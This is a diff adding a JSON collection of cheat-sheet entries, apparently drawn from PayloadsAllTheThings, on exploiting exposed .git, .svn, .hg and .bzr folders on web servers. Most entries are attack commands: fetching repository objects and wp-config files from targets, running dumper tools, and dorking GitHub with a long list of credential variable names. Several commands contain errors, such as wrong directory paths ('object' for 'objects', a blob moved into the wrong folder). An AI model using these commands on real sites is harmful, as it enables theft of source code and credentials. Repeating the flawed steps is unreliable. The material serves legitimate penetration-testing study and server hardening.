@@ -1,0 +1,209 @@
+{
+  "category": "Insecure Source Code Management",
+  "source": "PayloadsAllTheThings/Insecure Source Code Management/",
+  "entries": [
+    {
+      "subcategory": "Detection",
+      "title": "Why exposed SCM folders are dangerous",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "If version control system folders (.git, .svn, .hg, .bzr) are accessible in production, this is critical:\n• Source Code Leaks - you can download the entire repository and obtain the application's logic.\n• Sensitive Information Exposure - secrets, configs, and credentials are often inside the code.\n• Commit History Exposure - the commit history shows what was once exposed and \"cleaned up\" (but remained in history)."
+    },
+    {
+      "subcategory": "Detection",
+      "title": "Manually checking standard SCM paths",
+      "language": "text",
+      "tags": ["detection", "recon"],
+      "body": "First, manually check the typical paths:\n  Git: http://target.com/.git/\n  SVN: http://target.com/.svn/\n  Mercurial: http://target.com/.hg/\n  Bazaar: http://target.com/.bzr/\nLook at the HTTP response code and content. You may need to bypass .htaccess rules or a reverse proxy.\nImportant: for Git a directory listing is not required - the data is extracted as long as the files are readable."
+    },
+    {
+      "subcategory": "Detection",
+      "title": "NGINX rule that returns 403 instead of 404 on /.git",
+      "language": "bash",
+      "tags": ["detection", "nginx", "fingerprint"],
+      "body": "location /.git {\n  deny all;\n}"
+    },
+    {
+      "subcategory": "Git",
+      "title": "Which files to check before dumping .git",
+      "language": "text",
+      "tags": ["git", "detection"],
+      "body": "Dumping .git is possible if these files are readable:\n  .git/config\n  .git/HEAD\n  .git/logs/HEAD\nLook for 403 Forbidden or a directory listing to find the /.git/ directory.\nGit stores all information in .git/logs/HEAD (also try lowercase head)."
+    },
+    {
+      "subcategory": "Git",
+      "title": "Example contents of .git/logs/HEAD",
+      "language": "text",
+      "tags": ["git", "history"],
+      "body": "0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git\n15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.\n26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.\n6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing."
+    },
+    {
+      "subcategory": "Git",
+      "title": "Manually recovering a file by commit hash",
+      "language": "bash",
+      "tags": ["git", "recovery", "manual"],
+      "body": "# create an empty .git repository\ngit init test\ncd test/.git\n\n# download the file\nwget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c\n\n# first byte for subdirectory, remaining bytes for filename\nmkdir .git/object/26\nmv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/\n\n# display the file\ngit cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c\n    tree 323240a3983045cdc0dec2e88c1358e7998f2e39\n    parent 15ca375e54f056a576905b41a417b413c57df6eb\n    author Michael <michael@easyctf.com> 1489390329 +0000\n    committer Michael <michael@easyctf.com> 1489390329 +0000\n    Initial."
+    },
+    {
+      "subcategory": "Git",
+      "title": "Reading a tree object",
+      "language": "bash",
+      "tags": ["git", "recovery", "tree"],
+      "body": "wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39\nmkdir .git/object/32\nmv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/\n\ngit cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39\n    040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css\n    100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt\n    040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts\n    100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html\n    040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js"
+    },
+    {
+      "subcategory": "Git",
+      "title": "Reading file contents (blob)",
+      "language": "bash",
+      "tags": ["git", "recovery", "blob"],
+      "body": "wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f\nmkdir .git/object/cb\nmv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/\ngit cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f"
+    },
+    {
+      "subcategory": "Git",
+      "title": "Recovering files from .git/index with gin",
+      "language": "bash",
+      "tags": ["git", "recovery", "index"],
+      "body": "# git index file parser: https://pypi.python.org/pypi/gin (python3)\npip3 install gin\ngin ~/git-repo/.git/index"
+    },
+    {
+      "subcategory": "Git",
+      "title": "Extracting file names and sha1 from the index",
+      "language": "bash",
+      "tags": ["git", "index", "recovery"],
+      "body": "# recover the name and sha1 of each file from the index, then proceed as with manual recovery\n$ gin .git/index | egrep -e \"name|sha1\"\nname = AWS Amazon Bucket S3/README.md\nsha1 = 862a3e58d138d6809405aa062249487bee074b98\n\nname = CRLF injection/README.md\nsha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141"
+    },
+    {
+      "subcategory": "Git",
+      "title": "git-dumper.py - auto-dump .git",
+      "language": "bash",
+      "tags": ["git", "git-dumper", "dump"],
+      "body": "# https://github.com/arthaud/git-dumper\npip install -r requirements.txt\n./git-dumper.py http://web.site/.git ~/website"
+    },
+    {
+      "subcategory": "Git",
+      "title": "diggit.py - downloading an object by hash",
+      "language": "bash",
+      "tags": ["git", "diggit", "dump"],
+      "body": "# https://github.com/bl4de/security-tools/\n# -u — the remote path where the .git folder is located\n# -t — the path to a local folder with an empty Git repo where blobs are saved under their real names (cd /path/to/temp/folder && git init)\n# -o — the hash of the specific Git object to download\n./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]\n./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1"
+    },
+    {
+      "subcategory": "Git",
+      "title": "GoGitDumper - auto-dump .git",
+      "language": "bash",
+      "tags": ["git", "gogitdumper", "dump"],
+      "body": "# https://github.com/c-sto/gogitdumper\ngo get github.com/c-sto/gogitdumper\ngogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/\ngit log\ngit checkout"
+    },
+    {
+      "subcategory": "Git",
+      "title": "rip-git (dvcs-ripper) - dump and read objects",
+      "language": "bash",
+      "tags": ["git", "dvcs-ripper", "dump"],
+      "body": "# https://github.com/kost/dvcs-ripper\nperl rip-git.pl -v -u \"http://web.site/.git/\"\n\ngit cat-file -p 07603070376d63d911f608120eb4b5489b507692\ntree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2\nparent 15ca375e54f056a576905b41a417b413c57df6eb\nauthor Michael <michael@easyctf.com> 1489389105 +0000\ncommitter Michael <michael@easyctf.com> 1489389105 +0000\n\ngit cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2"
+    },
+    {
+      "subcategory": "Git",
+      "title": "GitHack - auto-dump .git",
+      "language": "bash",
+      "tags": ["git", "githack", "dump"],
+      "body": "# https://github.com/lijiejie/GitHack\nGitHack.py http://web.site/.git/"
+    },
+    {
+      "subcategory": "Git",
+      "title": "GitTools (gitdumper) - dump and checkout",
+      "language": "bash",
+      "tags": ["git", "gittools", "dump"],
+      "body": "# https://github.com/internetwache/GitTools\n./gitdumper.sh http://target.tld/.git/ /tmp/destdir\ngit checkout -- ."
+    },
+    {
+      "subcategory": "Git",
+      "title": "noseyparker - searching for secrets in code and Git history",
+      "language": "bash",
+      "tags": ["git", "secrets", "noseyparker"],
+      "body": "# https://github.com/praetorian-inc/noseyparker — searches for secrets in text and Git history\ngit clone https://github.com/trufflesecurity/test_keys\ndocker run -v \"$PWD\":/scan ghcr.io/praetorian-inc/noseyparker:latest scan --datastore datastore.np ./test_keys/\ndocker run -v \"$PWD\":/scan ghcr.io/praetorian-inc/noseyparker:latest report --color always\nnoseyparker scan --datastore np.noseyparker --git-url https://github.com/praetorian-inc/noseyparker\nnoseyparker scan --datastore np.noseyparker --github-user octocat"
+    },
+    {
+      "subcategory": "Git",
+      "title": "trufflehog - secrets and entropy in Git history",
+      "language": "bash",
+      "tags": ["git", "secrets", "trufflehog"],
+      "body": "# searches repositories for high-entropy strings and secrets, digs deep into commit history\npip install truffleHog\ntruffleHog --regex --entropy=False https://github.com/trufflesecurity/trufflehog.git"
+    },
+    {
+      "subcategory": "Git",
+      "title": "Yar - searching for secrets across users/orgs repos",
+      "language": "bash",
+      "tags": ["git", "secrets", "yar"],
+      "body": "# searches for secrets across users'/organizations' repositories (regex, entropy, or both). Inspired by truffleHog\ngo get github.com/nielsing/yar # https://github.com/nielsing/yar\nyar -o orgname --both"
+    },
+    {
+      "subcategory": "Git",
+      "title": "Gitrob - sensitive files in public repos",
+      "language": "bash",
+      "tags": ["git", "secrets", "gitrob"],
+      "body": "# clones a user's/organization's repositories to a given depth, walks the history, and flags files by signatures of potentially sensitive ones\ngo get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob\nexport GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\ngitrob [options] target [target2] ... [targetN]"
+    },
+    {
+      "subcategory": "Git",
+      "title": "Gitleaks - searching for unencrypted secrets",
+      "language": "bash",
+      "tags": ["git", "secrets", "gitleaks"],
+      "body": "# searching for unencrypted secrets and unwanted data in Git repositories\n# public repository\ndocker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git\n\n# local repository, already cloned to /tmp/\ndocker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks\n\n# a specific Pull Request on GitHub\ndocker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000"
+    },
+    {
+      "subcategory": "Subversion (.svn)",
+      "title": "svn-extractor - extracting resources from .svn",
+      "language": "bash",
+      "tags": ["svn", "svn-extractor", "dump"],
+      "body": "# https://github.com/anantshri/svn-extractor — extracts all web resources via an exposed .SVN folder\npython svn-extractor.py --url \"url with .svn available\""
+    },
+    {
+      "subcategory": "Subversion (.svn)",
+      "title": "Reading a file directly from text-base",
+      "language": "bash",
+      "tags": ["svn", "manual"],
+      "body": "curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base"
+    },
+    {
+      "subcategory": "Subversion (.svn)",
+      "title": "Manual recovery via .svn/wc.db",
+      "language": "text",
+      "tags": ["svn", "recovery", "manual"],
+      "body": "1. Download the svn database: http://server/path_to_vulnerable_site/.svn/wc.db\n   Inside NODES there are rows like:\n   INSERT INTO \"NODES\" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);\n\n2. Download the files of interest:\n   • remove the $sha1$ prefix\n   • add the .svn-base suffix\n   • the first byte of the hash is the subdirectory inside pristine/ (here 94)\n   • the resulting path: http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base"
+    },
+    {
+      "subcategory": "Mercurial (.hg)",
+      "title": "rip-hg.pl (dvcs-ripper) - dump .hg",
+      "language": "bash",
+      "tags": ["mercurial", "dvcs-ripper", "dump"],
+      "body": "# https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl — ripper for web-accessible SVN/GIT/HG\ndocker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u"
+    },
+    {
+      "subcategory": "Bazaar (.bzr)",
+      "title": "rip-bzr.pl (dvcs-ripper) - dump .bzr",
+      "language": "bash",
+      "tags": ["bazaar", "dvcs-ripper", "dump"],
+      "body": "# https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl\ndocker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u"
+    },
+    {
+      "subcategory": "Bazaar (.bzr)",
+      "title": "bzr_dumper - auto-dump Bazaar",
+      "language": "bash",
+      "tags": ["bazaar", "bzr-dumper", "dump"],
+      "body": "# https://github.com/SeahunOh/bzr_dumper\npython3 dumper.py -u \"http://127.0.0.1:5000/\" -o source\nCreated a standalone tree (format: 2a)\n[!] Target : http://127.0.0.1:5000/\n[+] Start.\n[+] GET repository/pack-names\n[+] GET README\n[+] GET checkout/dirstate\n[+] GET checkout/views\n[+] GET branch/branch.conf\n[+] GET branch/format\n[+] GET branch/last-revision\n[+] GET branch/tag\n[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'\n[*] Finish"
+    },
+    {
+      "subcategory": "Bazaar (.bzr)",
+      "title": "Recovering files via bzr revert",
+      "language": "bash",
+      "tags": ["bazaar", "recovery"],
+      "body": "bzr revert\n N  application.py\n N  database.py\n N  static/"
+    },
+    {
+      "subcategory": "GitHub Dorks",
+      "title": "Dorks for secret leaks in code (env variables)",
+      "language": "text",
+      "tags": ["github-dorks", "secrets", "recon"],
+      "body": "Environment variable names that often leak secrets in public repos. Search for them (GitHub code search / dorks) as keys next to their values:\nGITHUB_TOKEN, GH_TOKEN, GITHUB_ACCESS_TOKEN, GITHUB_API_TOKEN, GITHUB_OAUTH_TOKEN, GITHUB_DEPLOY_TOKEN, NPM_TOKEN, NPM_AUTH_TOKEN, NPM_API_KEY,\nDOCKER_PASSWORD, DOCKER_USERNAME, DOCKERHUB_PASSWORD, DOCKER_TOKEN,\nAWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SECRET_KEY, AMAZON_SECRET_ACCESS_KEY, S3_SECRET_KEY, S3_ACCESS_KEY_ID,\nHEROKU_API_KEY, FIREBASE_TOKEN, FIREBASE_API_TOKEN, GCLOUD_SERVICE_KEY, DIGITALOCEAN_ACCESS_TOKEN,\nSLACK_WEBHOOK_URL, SLACK_CHANNEL, MAILGUN_API_KEY, MG_API_KEY, SENDGRID_API_KEY, TWILIO_API_KEY, TWILIO_ACCOUNT_SID, TWILIO_TOKEN,\nDB_USER, DB_PASSWORD, DATABASE_PASSWORD, MYSQL_PASSWORD, MYSQL_USERNAME, MONGOLAB_URI, DATABASE_USER,\nFTP_PASSWORD, FTP_USER, FTP_LOGIN, SSHPASS, SSH_PRIVATE_KEY, GPG_PRIVATE_KEY, GPG_PASSPHRASE, LINUX_SIGNING_KEY,\nSONATYPE_PASSWORD, SONATYPE_USERNAME, NEXUS_PASSWORD, ARTIFACTORY_KEY, PYPI_PASSWORD, TWINE_PASSWORD, RUBYGEMS_AUTH_TOKEN,\nOKTA_CLIENT_TOKEN, AUTH0_CLIENT_SECRET, AUTH0_API_CLIENTSECRET, PAYPAL_CLIENT_SECRET, STRIPE/ACCESS_TOKEN, OAUTH_TOKEN, REFRESH_TOKEN,\nSVN_USER, SVN_PASS, GIT_TOKEN, GIT_USER, CYPRESS_RECORD_KEY, SNYK_TOKEN, SONAR_TOKEN, CODECOV_TOKEN, COVERALLS_REPO_TOKEN,\nSECRET_KEY_BASE, FLASK_SECRET_KEY, ANSIBLE_VAULT_PASSWORD, VAULT_ADDR, VAULT_APPROLE_SECRET_ID, PASSWORD, USERNAME, API_KEY, API_SECRET, ACCESS_TOKEN, CLIENT_SECRET.\nThe full list (~1400 keys) - Files/github-dorks.txt in PayloadsAllTheThings; use it as a wordlist for automated searching."
+    }
+  ]
+}
